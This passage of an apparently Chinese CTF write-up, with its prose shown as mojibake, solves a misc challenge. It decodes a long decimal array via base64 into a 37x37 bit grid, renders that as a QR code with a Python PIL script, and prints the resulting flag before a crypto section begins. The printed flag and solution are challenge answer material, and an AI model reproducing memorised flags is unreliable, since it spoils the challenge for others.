<span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">61</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œbase64è§£ç å¾—åˆ°ï¼š</p><p><code>0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000</code></p><p>37*37çš„01å­—ç¬¦ä¸²ï¼Œè½¬ä¸ºäºŒç»´ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">37</span>))</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">37</span>*i+j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰«ç å¾—flagï¼š<code>flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</code></p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LinearEquations"><a href="#LinearEquations" class="headerlink" title="LinearEquations"></a>LinearEquations</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 